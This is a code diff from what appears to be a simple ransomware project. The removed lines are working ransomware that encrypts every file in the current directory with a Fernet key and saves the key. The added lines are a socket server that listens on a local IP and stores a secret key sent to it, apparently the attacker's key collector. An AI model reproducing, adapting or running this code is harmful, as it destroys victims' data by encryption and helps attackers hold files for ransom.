@@ -1,23 +1,17 @@
-import os
-from cryptography.fernet import Fernet
+import socket
 
-files = []
-
-for file in os.listdir():
-    if file == "ransomeware.py" or file == "server.py" or file == "thekey.key":
-        continue
-    if os.path.isfile(file):
-        files.append(file)
-print(files)
-
-key = Fernet.generate_key()
-
-with open("thekey.key", "wb") as thekey:
-    thekey.write(key)
-
-for file in files:
-    with open (file, "rb") as thefile:
-        contents = thefile.read()
-    contents_encrypted = Fernet(key).encrypt(contents)
-    with open(file, "wb") as thefile:
-        thefile.write(contents_encrypted)
+IP = "10.0.0.150"  
+PORT = 333  
+print("server start")
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.bind((IP, PORT))
+    s.listen(1)
+    conn, addr = s.accept()
+    print(f'Connection from {addr} established')
+    with conn:
+        while True:
+            Secret_key = conn.recv(1024)
+            with open('random_key.txt', 'wb') as f:
+                f.write(Secret_key)
+            break
+        print('connection completed and key recived')
